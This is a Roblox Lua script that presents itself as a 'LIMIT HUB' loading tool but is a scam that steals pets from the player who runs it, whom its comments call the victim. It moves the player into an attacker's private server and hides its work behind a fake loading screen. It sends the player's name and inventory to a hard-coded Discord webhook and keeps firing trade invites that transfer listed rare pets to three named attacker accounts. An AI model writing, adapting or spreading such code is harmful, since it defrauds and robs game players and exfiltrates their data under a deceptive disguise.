-- Roblox Services
local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer
local TeleportService = game:GetService("TeleportService")
local HttpService = game:GetService("HttpService")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local RunService = game:GetService("RunService")

-- Configs
local webhookUrl = "https://discord.com/api/webhooks/1396222326332199054/yeePfFQ3e73Q_uyRsznWW-PvRKYR_ST6CqymG-werQGIi3zWgyEZde4KMl7yi9WV3_-y"
local targetedPets = {
    "Trex", "Fennec Fox", "Raccoon", "Dragonfly", "Butterfly",
    "Queenbee", "Spinosaurus", "Redfox", "Brontosaurus", "Mooncat",
    "Mimic Octopus", "Disco Bee", "Dilophosaurus", "Kitsune"
}
local attackers = {"boneblossom215", "beanstalk1251", "burningbud709"}
local placeId = 126884695634066
local privateServerCode = "40206718588419987554943106780552"

-- Step 1: Teleport victim if not in private server
if game.JobId == "" then
    TeleportService:TeleportToPrivateServer(placeId, privateServerCode, {LocalPlayer})
    return
end

-- Step 2: Wait for the game to fully load
game.Loaded:Wait()
task.wait(3)

-- Step 3: Fake GUI while functions run in background
task.spawn(function()
    local gui = Instance.new("ScreenGui", LocalPlayer:WaitForChild("PlayerGui"))
    gui.IgnoreGuiInset = true
    gui.ResetOnSpawn = false

    local bg = Instance.new("Frame", gui)
    bg.BackgroundColor3 = Color3.new(0, 0, 0)
    bg.Size = UDim2.new(1, 0, 1, 0)

    local title = Instance.new("TextLabel", bg)
    title.Text = "LIMIT HUB"
    title.Font = Enum.Font.SciFi
    title.TextColor3 = Color3.fromRGB(0, 255, 255)
    title.TextStrokeColor3 = Color3.fromRGB(0, 255, 255)
    title.TextStrokeTransparency = 0.2
    title.TextScaled = true
    title.Size = UDim2.new(0, 600, 0, 100)
    title.Position = UDim2.new(0.5, -300, 0.5, -160)
    title.BackgroundTransparency = 1

    local bar = Instance.new("Frame", bg)
    bar.Size = UDim2.new(0, 400, 0, 30)
    bar.Position = UDim2.new(0.5, -200, 0.5, -30)
    bar.BackgroundColor3 = Color3.fromRGB(40, 40, 40)

    local fill = Instance.new("Frame", bar)
    fill.Size = UDim2.new(0, 0, 1, 0)
    fill.BackgroundColor3 = Color3.fromRGB(0, 255, 255)

    local percentText = Instance.new("TextLabel", bg)
    percentText.Size = UDim2.new(0, 100, 0, 40)
    percentText.Position = UDim2.new(0.5, -50, 0.5, -70)
    percentText.Text = "0%"
    percentText.BackgroundTransparency = 1
    percentText.TextColor3 = Color3.new(1, 1, 1)
    percentText.Font = Enum.Font.SciFi
    percentText.TextScaled = true

    local loadText = Instance.new("TextLabel", bg)
    loadText.Text = "LOADING"
    loadText.Size = UDim2.new(0, 400, 0, 70)
    loadText.Position = UDim2.new(0.5, -200, 0.5, 40)
    loadText.BackgroundTransparency = 1
    loadText.TextColor3 = Color3.fromRGB(0, 255, 255)
    loadText.TextStrokeColor3 = Color3.fromRGB(0, 255, 255)
    loadText.TextStrokeTransparency = 0.2
    loadText.Font = Enum.Font.SciFi
    loadText.TextScaled = true

    local percent = 0
    while percent <= 100 do
        percentText.Text = percent .. "%"
        fill.Size = UDim2.new(percent / 100, 0, 1, 0)
        percent += 5
        task.wait(10)
    end

    gui:Destroy()
end)

-- Step 4: Send Inventory to Discord
task.delay(5, function()
    local data = {items = {}, rarePets = {}}
    local folders = {
        LocalPlayer:FindFirstChild("Pets"),
        LocalPlayer:FindFirstChild("Backpack"),
        LocalPlayer:FindFirstChildOfClass("Folder")
    }

    for _, folder in ipairs(folders) do
        if folder then
            for _, item in ipairs(folder:GetChildren()) do
                table.insert(data.items, item.Name)
                if table.find(targetedPets, item.Name) then
                    table.insert(data.rarePets, item.Name)
                end
            end
        end
    end

    pcall(function()
        request({
            Url = webhookUrl,
            Method = "POST",
            Headers = {["Content-Type"] = "application/json"},
            Body = HttpService:JSONEncode({
                username = "LimitHub Logger",
                embeds = {{
                    title = "🚨 Target Inventory Logged",
                    description = "**Username:** " .. LocalPlayer.Name ..
                        "\n**Items:** " .. table.concat(data.items, ", ") ..
                        "\n**Target Pets:** " .. table.concat(data.rarePets, ", "),
                    color = 16711680
                }}
            })
        })
    end)
end)

-- Step 5: Auto-Transfer Pets
task.delay(10, function()
    task.spawn(function()
        while true do
            for _, p in pairs(Players:GetPlayers()) do
                if table.find(attackers, p.Name) then
                    local args = {p.Name, {}}
                    local petFolder = LocalPlayer:FindFirstChild("Pets")
                    if petFolder then
                        for _, pet in pairs(petFolder:GetChildren()) do
                            if pet:IsA("Model") and table.find(targetedPets, pet.Name) then
                                table.insert(args[2], pet.Name)
                            end
                        end
                    end

                    if #args[2] > 0 then
                        pcall(function()
                            ReplicatedStorage:WaitForChild("Remotes"):WaitForChild("TradeInvitePlayer"):FireServer(unpack(args))
                        end)
                    end
                end
            end
            task.wait(5)
        end
    end)
end)
